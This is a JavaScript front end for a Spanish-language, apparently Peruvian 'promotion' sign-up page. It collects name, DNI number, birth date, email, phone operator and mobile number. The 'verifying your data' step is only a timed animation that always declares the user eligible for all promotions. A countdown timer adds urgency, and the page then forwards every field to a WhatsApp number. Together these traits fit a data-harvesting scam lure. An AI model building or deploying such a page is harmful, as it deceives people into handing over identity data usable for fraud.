//==============================
// PANTALLAS
//==============================

const pantalla1 = document.getElementById("pantalla1");
const pantalla2 = document.getElementById("pantalla2");
const pantalla3 = document.getElementById("pantalla3");

const btnVermas = document.getElementById("btnVermas");
const btnParticipar = document.getElementById("btnParticipar");


//==============================
// Pantalla 1 -> Pantalla 2
//==============================

btnVermas.addEventListener("click", () => {

    pantalla1.classList.remove("activa");
    pantalla2.classList.add("activa");
    pantalla3.classList.remove("activa");

    window.scrollTo({
        top: 0,
        behavior: "smooth"
    });

});


//==============================
// Pantalla 2 -> Pantalla 3
//==============================

btnParticipar.addEventListener("click", () => {

    pantalla2.classList.remove("activa");
    pantalla3.classList.add("activa");

    window.scrollTo({
        top: 0,
        behavior: "smooth"
    });

});


//==============================
// SWIPER
//==============================

const swiper = new Swiper(".patrocinadoresSwiper", {

    loop: true,

    speed: 700,

    grabCursor: true,

    autoplay: {

        delay: 3000,

        disableOnInteraction: false

    },

    pagination: {

        el: ".swiper-pagination",

        clickable: true

    }

});


//==============================
// FORMULARIO
//==============================

const formulario = document.getElementById("formRegistro");

const nombre = document.getElementById("nombre");
const dni = document.getElementById("dni");
const fecha = document.getElementById("fecha");
const departamento = document.getElementById("departamento");
const correo = document.getElementById("correo");
const operador = document.getElementById("operador");
const telefono = document.getElementById("telefono");


//==============================
// PANTALLA DE CARGA
//==============================

const modal = document.getElementById("modal");

const tituloModal = document.getElementById("tituloModal");

const mensajeModal = document.getElementById("mensajeModal");

const loader = document.querySelector(".loader");



//==============================
// SOLO NÚMEROS
//==============================

dni.addEventListener("input",()=>{

    dni.value=dni.value.replace(/\D/g,'');

});

telefono.addEventListener("input",()=>{

    telefono.value=telefono.value.replace(/\D/g,'');

});

//==============================
// FORMATO FECHA AUTOMÁTICO
//==============================

fecha.addEventListener("input",()=>{

    let valor = fecha.value.replace(/\D/g,'');

    if(valor.length > 8){
        valor = valor.substring(0,8);
    }

    if(valor.length >= 5){

        fecha.value =
        valor.substring(0,2) + "/" +
        valor.substring(2,4) + "/" +
        valor.substring(4);

    }
    else if(valor.length >= 3){

        fecha.value =
        valor.substring(0,2) + "/" +
        valor.substring(2);

    }
    else{

        fecha.value = valor;

    }

});


//==============================
// VALIDAR
//==============================

formulario.addEventListener("submit",function(e){

    e.preventDefault();

    let correcto=true;

    limpiarErrores();



    //==============================
    // Nombre
    //==============================

    if(nombre.value.trim().length<8){

        mostrarError(nombre,
        "Ingrese nombres y apellidos.");

        correcto=false;

    }



    //==============================
    // DNI
    //==============================

    if(!/^\d{8}$/.test(dni.value)){

        mostrarError(dni,
        "El DNI debe tener 8 números.");

        correcto=false;

    }



    //==============================
    // Fecha
    //==============================

    if(fecha.value===""){

        mostrarError(fecha,
        "Seleccione una fecha.");

        correcto=false;

    }

    //==============================
    // Departamento
    //==============================

    if(departamento.value === ""){

        mostrarError(
            departamento,
            "Seleccione su departamento."
        );

        correcto = false;

    }

    //==============================
    // Correo
    //==============================

    const regexCorreo = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if(correo && !regexCorreo.test(correo.value.trim())){

        mostrarError(
            correo,
            "Ingrese un correo válido."
        );

        correcto = false;

    }

    //==============================
    // Operador
    //==============================

    if(operador.value === ""){

        mostrarError(
            operador,
            "Seleccione un operador."
        );

        correcto = false;

    }
    //==============================
    // Teléfono
    //==============================

    if(!/^9\d{8}$/.test(telefono.value)){

        mostrarError(
        telefono,
        "Ingrese un celular válido.");

        correcto=false;

    }



    if(!correcto) return;



    //==============================
    // MOSTRAR CARGA
    //==============================

    contador.style.display="none";
    modal.style.display="flex";



    tituloModal.innerHTML="Comprobando...";
    mensajeModal.innerHTML="Verificando tus datos.";
    loader.style.display="flex";



    setTimeout(()=>{

        loader.style.display="none";

        tituloModal.innerHTML="¡¡FELICIDADES!!";

        mensajeModal.innerHTML=`
        Usted es apto para participar 
        en todas las promociones
        .<br><br>
        Redirigiendo a WhatsApp...
        `;

    },2500);



    setTimeout(() => {

    const mensaje = `
        *NUEVO REGISTRO MODOPROMO*

        Nombres: ${nombre.value}
        DNI: ${dni.value}
        Fecha de nacimiento: ${fecha.value}
        Departamento: ${departamento.value}
        Correo: ${correo.value}
        Operador: ${operador.value}
        Celular: ${telefono.value}
        `;

        window.location.href =
        "https://wa.me/51999999999?text=" +
        encodeURIComponent(mensaje);

}, 5500)


});



//==============================
// MOSTRAR ERROR
//==============================

function mostrarError(input,mensaje){

    input.parentElement
    .querySelector(".error")
    .textContent=mensaje;

}



//==============================
// LIMPIAR
//==============================

function limpiarErrores(){

    document
    .querySelectorAll(".error")
    .forEach(error=>{

        error.textContent="";

    });

}

//=====================================
// TEMPORIZADOR GLOBAL
//=====================================

let tiempo = 320;

const contador = document.createElement("div");

contador.id = "contador";

document.body.appendChild(contador);

actualizarContador();

const intervalo = setInterval(() => {

    tiempo--;

    actualizarContador();

    if (tiempo <= 0) {

        reiniciarAplicacion();

    }

}, 1000);



function actualizarContador(){

    const minutos = Math.floor(tiempo / 60);

    const segundos = tiempo % 60;

    contador.textContent =
        `${String(minutos).padStart(2,"0")}:${String(segundos).padStart(2,"0")}`;

}


function reiniciarAplicacion(){

    formulario.reset();

    limpiarErrores();

    // Oculta el modal
    modal.style.display = "none";

    // Vuelve a mostrar el loader para la próxima vez
    loader.style.display = "flex";

    // Restablece el texto del modal
    tituloModal.innerHTML = "Comprobando...";
    mensajeModal.innerHTML = "Verificando tus datos.";

    // Muestra nuevamente el contador
    contador.style.display = "block";

    // Regresa a la pantalla inicial
    pantalla1.classList.add("activa");
    pantalla2.classList.remove("activa");
    pantalla3.classList.remove("activa");

    // Reinicia el tiempo
    tiempo = 320;

}
